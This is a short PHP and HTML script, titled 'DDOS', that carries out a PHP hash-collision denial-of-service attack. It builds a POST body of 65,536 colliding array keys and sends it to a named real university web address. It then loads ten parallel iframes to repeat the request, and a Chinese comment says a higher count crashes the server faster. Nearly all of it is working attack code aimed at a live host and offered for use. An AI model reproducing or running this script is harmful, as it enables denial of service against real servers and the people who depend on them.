<?php
$host = 'http://zhuoyuezs.hdu.edu.cn/index.php/DetailInformation/detailArticle';
$data = 'PHP_CO_testing';
$size = pow(2, 16);
for ($key=0, $max=($size-1)*$size; $key<=$max; $key+=$size)
{
    $data .= '&array[' . $key . ']=0';
}

$ret = curlsite($host, ltrim($data,'&'));
var_dump($ret);
function curlsite($url, $post, $timeout = 30){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout - 5);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    $output = curl_exec($ch);
    if ($output === false) return false;
    $info = curl_getinfo($ch);
    $http_code = $info['http_code'];
    if ($http_code == 404) return false;
    curl_close($ch);
    return $output;
}
?>

<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <title>DDOS</title>
</head>

<body>
PHP HASH Collision Test
<!--并发数，这里我写的10，改的更高，服务器挂的更快-->
<?php
for($i=0; $i<10; $i++){
    echo "window".$i;
    echo '<iframe src="test.php?test='.$i.'" scrolling="false" frameborder="1" allowtransparency="true" style="background-color:transparent;"></iframe><br />';
}
?>
</body>
</html>